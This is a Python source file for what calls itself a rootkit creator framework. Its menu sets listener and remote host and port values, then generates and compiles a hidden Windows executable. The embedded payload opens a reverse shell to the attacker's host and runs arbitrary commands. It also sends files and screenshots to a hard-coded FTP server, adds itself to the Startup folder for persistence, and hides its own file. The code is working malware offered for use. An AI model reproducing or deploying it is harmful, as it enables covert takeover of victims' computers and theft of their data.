# Script Made By 17mj
# --------------------
import os
from configparser import ConfigParser
import time

boldunderlinedCommands = '\033[1;4m' + 'Commands:' + '\033[0m'
boldunderlinedBanner = '\033[1;4m' + 'Welcome To 17mj Framework' + '\033[0m'

banner = f'''
       __________________________________________________________________________
        |--------------------- {boldunderlinedBanner} ! ---------------------|
        |                            Made By haxerr_                           |
        |                                                                      |
        |                        Discord: hax9999                              |
        ________________________________________________________________________ 
    '''


options = f'''
{boldunderlinedCommands}
   ________________________________________________________________________________________
    |------------------------------------------------------------------------------------|
    |                                                                                    |
    |      start listener / ftpserver         Start Port Listener or FTP Server.         |
    |      stop listener / ftpserver          Stop Port Listener Or FTP Server.          |
    |                                                                                    |
    |      set lhost <IP>                     Set Value Of Local Host For Listener.      |
    |      set lport <PORT>                   Set Value Of Local Port For Listener.      |
    |                                                                                    |
    |                                                                                    |
    |      creator                            Switch To Rootkit Creator Mode.            |
    |                                                                                    |
    |      show options                       Show Given Options.                        |
    |                                                                                    |
    |      clear                              Clear Console.                             |
    |      help                               Display This Help Menu.                    |
   _________________________________________________________________________________________

Note: If you already have a rootkit, you can just use listener. You dont need to create one again.
        '''

message = '     Enjoy Your FUD Rootkit ;)\n '

print(banner)
time.sleep(0.3)
print(options)
time.sleep(0.3)
print(message)
time.sleep(0.3)
print('\n [?] Loading Framework...')

time.sleep(2)
config = ConfigParser()
config.read(r'config.ini')

while True:
    selection = input('MJv3.11 >>> ')

    # Start Listener Command
    if selection.lower() == 'start listener':
        os.system('start listener.py')
        print('[+] Port Listener Started')

    # Stop Listener Command
    elif selection.lower() == 'stop listener':
        os.system('taskkill /F /IM haxshell.py')
        print('[+] Port Listener Stopped.')

    # Start FTP Server Command
    elif selection.lower() == 'start ftpserver':
        os.system('start ftpServer.py')
        print('[+] FTP Server Started.')
        
    # Stop FTP Server Command
    elif selection.lower() == 'stop ftpserver':
        os.system('taskkill /F /IM ftpServer.py')
        print('[+] FTP Server Stopped.')

    # Set LHOST Command
    elif selection.lower().startswith('set lhost '):
        lhost = selection.replace('set lhost ', '')

        config['DATABASE']['lhost'] = lhost

        with open('config.ini', 'w') as f:
            config.write(f)
        
        print('\n[+] Local Host Successfully Changed\n')

    # Set LPORT Command
    elif selection.lower().startswith('set lport '):
        lport = selection.replace('set lport ', '')

        config['DATABASE']['lport'] = lport

        with open('config.ini', 'w') as f:
            config.write(f)
        
        print('\n[+] Local Port Successfully Changed\n')

    # Show Options Command
    elif selection.lower() == 'show options':
        print(f'''

Current Options:

    <    Local Host (LHOST) = {config['DATABASE']['lhost']}   >

    <    Local Port (LPORT) = {config['DATABASE']['lport']}    >

''')
            

    # Create Command
    elif selection.lower() == 'creator':
        os.system('cls')
        time.sleep(0.5)
        print('\n[?] Switched To Creator Mode\n')
        creatorOptions = f'''
{boldunderlinedCommands}
   __________________________________________________________________________________________________
    |----------------------------------------------------------------------------------------------|
    |                                                                                              |
    |      set rhost <IP>                     Set Value Of Remote Host For Rootkit.                |
    |      set rport <PORT>                   Set Value Of Remote Port For Rootkit.                |
    |                                                                                              |
    |      create <FILE NAME>                 Give A Name For Rootkit And Create.                  |
    |                                                                                              |
    |      exit                               Exit Rootkit Creator Mode                            |
    |                                                                                              |
    |                                                                                              |
    |      clear                              Clear Console.                                       |
    |      help                               Display This Help Menu.                              |
   __________________________________________________________________________________________________

        '''

        print(creatorOptions)

        while True:
            creatorselection = input('[Rootkit Creator] >>> ')

            # Set RHOST Command
            if creatorselection.lower().startswith('set rhost '):
                global rhost
                rhost = creatorselection.replace('set rhost ', '')
                print('\n[+] Remote Host Successfully Changed\n')

            # Set RPORT Command
            elif creatorselection.lower().startswith('set rport '):
                rport = creatorselection.replace('set rport ', '')
                print('\n[+] Remote Port Successfully Changed\n')

            # Set Name
            elif creatorselection.lower().startswith('create '):
                fileName = creatorselection.replace('create ', '')
                fileNameInPython = f'{fileName}.py'

                os.system('mkdir ROOTKITS')
                os.chdir('ROOTKITS')

                with open(fileNameInPython, 'w') as file:
                    rootkit = f"""
# Script Made By 17mj
# -------------------
import socket
import time
import os 
from ftplib import FTP
import pyautogui
from getpass import getuser

time.sleep(3)

HOST = '{rhost}'
PORT = {rport}   
"""
                    rootkit2 = """
def connectToFTP(server, username, password):
    ftp = FTP(server)
    ftp.login(user=username, passwd=password)
    return ftp

def uploadFile(ftp, remote_filename, local_filename):
    with open(local_filename, 'wb') as f:
        ftp.retrbinary(f"RETR {remote_filename}", f.write)

def downloadFile(ftp, local_filename, remote_filename):
    with open(local_filename, 'rb') as f:
        ftp.storbinary(f"STOR {remote_filename}", f)

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except Exception as e:
            time.sleep(3)   

def reverseShell():
    while True:
        try:
            s = connect()
            while True:
                command = s.recv(1024).decode()

                # Exit Command 
                if command.lower() == 'exit':
                    s.close()
                    break
                #--------------------------------


                # Working Directory Command
                elif command.lower() == 'pwd':
                    cwd = os.getcwd()
                    s.send(cwd.encode())
                #--------------------------------


                # Change Directory Command
                elif command.lower().startswith('cd '):
                    cut = 'cd '
                    changeDir = command.replace(cut, '')
                    os.chdir(changeDir)
                    cwd = os.getcwd()
                    changedDir = (f'[?] Directory Changed To {cwd}')
                    s.send(changedDir.encode())
                #--------------------------------   


                # List Dir Command
                elif command.lower() == 'ls':
                    listDir = os.popen('dir /b').read()
                    s.send(listDir.encode())
                #--------------------------------


                # Make Dir Command
                elif command.lower().startswith('mkdir '):
                    cut = 'mkdir '
                    dirName = command.replace(cut,'')
                    newCommand = f'mkdir {dirName}'
                    os.popen(newCommand)
                    result = '[?] Directory Created.'
                    s.send(result.encode())
                #--------------------------------
                

                # Remove Dir Command
                elif command.lower().startswith('rmdir '):
                    cut = 'rmdir '
                    removeDirName = command.replace(cut,'')
                    newCommand = f'rmdir {removeDirName}'
                    os.popen(newCommand)
                    result = '[?] Directory Removed.'
                    s.send(result.encode())
                #--------------------------------


                # Make File Command
                elif command.lower().startswith('mkf '):
                    cut = 'mkf '
                    makeFileName = command.replace(cut,'')
                    newCommand = f'type nul > {makeFileName}'
                    os.popen(newCommand)
                    result = '[?] File Created.'
                    s.send(result.encode())
                #--------------------------------


                # Remove File Command
                elif command.lower().startswith('del '):
                    cut = 'del '
                    removeFileName = command.replace(cut,'')
                    newCommand = f'del {removeFileName}'
                    os.popen(newCommand)
                    result = '[?] File Deleted.'
                    s.send(result.encode())
                #--------------------------------


                # FTP Upload Command
                elif command.lower().startswith('upload '):
                    cut = 'upload '
                    remoteFileName = command.replace(cut, '')
                    localFileName = remoteFileName

                    server = "192.168.1.104"
                    username = "user"
                    password = "12345"
                    ftp = connectToFTP(server, username, password)

                    uploadFile(ftp, remoteFileName, localFileName)
                    
                    ftp.close()
                #--------------------------------


                # FTP Download Command
                elif command.lower().startswith('download '):
                    cut = 'download '
                    remoteFileName = command.replace(cut, '')
                    localFileName = remoteFileName

                    server = "192.168.1.104"
                    username = "user"
                    password = "12345"
                    ftp = connectToFTP(server, username, password)

                    downloadFile(ftp, remoteFileName, localFileName)

                    ftp.close()
                #--------------------------------


                # Take Screenshot Command
                elif command.lower() == 'screenshot':
                    pyautogui.screenshot('Screenshot.png')
                    remoteFileName = 'Screenshot.png'
                    localFileName = remoteFileName

                    server = "192.168.1.104"
                    username = "user"
                    password = "12345"
                    ftp = connectToFTP(server, username, password)

                    downloadFile(ftp, remoteFileName, localFileName)

                    ftp.close()
                    
                    os.popen('del Screenshot.png')
                    result = '[+] Successfully Took Screenshot.'
                    s.send(result.encode())
                #--------------------------------


                # Startup Command
                elif command.lower() == 'add startup':
                    user = getuser()
                    startupPath = rf'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
                    copyStartup = f'move /Y "{__file__}" "{startupPath}"'
                    print(copyStartup)
                    os.popen(copyStartup)
                    result = '[?] Successfully Added To Startup'
                    s.send(result.encode())
                #--------------------------------

                # Make Hidden Command
                elif command.lower() == 'hide rootkit':
                    os.system(f'attrib +h "{__file__}"')
                    result = '[?] Successfully Hided Rootkit'
                    s.send(result.encode())

                
                else:
                    output = os.popen(command).read()
                    s.send(output.encode())


        except KeyboardInterrupt:
            break 
        except Exception as e:
            pass

reverseShell()

"""
                    file.write(rootkit)
                    file.write(rootkit2)

                    os.system(f'pyinstaller --onefile --noconsole {fileNameInPython} && del {fileName}.spec')
                    
                    print('\n[+] Rootkit Successfully Created In EXE And PY Format In Rootkits Folder\n')
                    print('[?] EXE FORMATTED ROOTKIT IS IN THE "dist" FOLDER\n')
                    print('[?] YOU CAN DELETE "build" FOLDER\n')

            elif creatorselection.lower() == 'exit':
                os.system('cls')
                print('\n[?] Exited From Creator Mode\n')
                print(options)
                break

            elif creatorselection.lower() == 'help':
                print(creatorOptions)

            else:
                print('\n[-] Wrong Command\n')

    # Display Help Menu Command
    elif selection.lower() == 'help':
        print(options)

    # Clear Console Command.
    elif selection.lower() == 'clear':
        os.system('cls')
